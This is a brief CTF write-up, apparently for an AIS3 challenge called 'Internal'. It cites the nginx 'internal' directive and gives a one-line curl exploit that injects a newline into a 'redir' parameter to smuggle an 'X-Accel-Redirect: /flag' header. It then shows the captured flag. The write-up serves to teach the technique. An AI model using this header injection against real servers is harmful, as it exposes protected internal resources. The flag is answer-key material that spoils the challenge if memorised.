# Internal
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f5f445de-3668-4e00-b166-197c29c0f198)

## ref
[nginx doc internal](https://nginx.org/en/docs/http/ngx_http_core_module.html#internal)

## exploit
```bash
curl -vvv "$1?redir=$(urlencode "https://google.com
X-Accel-Redirect: /flag")"
```

## Flag
![image](https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/bdc8499e-b765-4b59-9e68-f5462358f2a8)

`AIS3{jU$T_sOM3_funNy_N91Nx_FEatur3}`
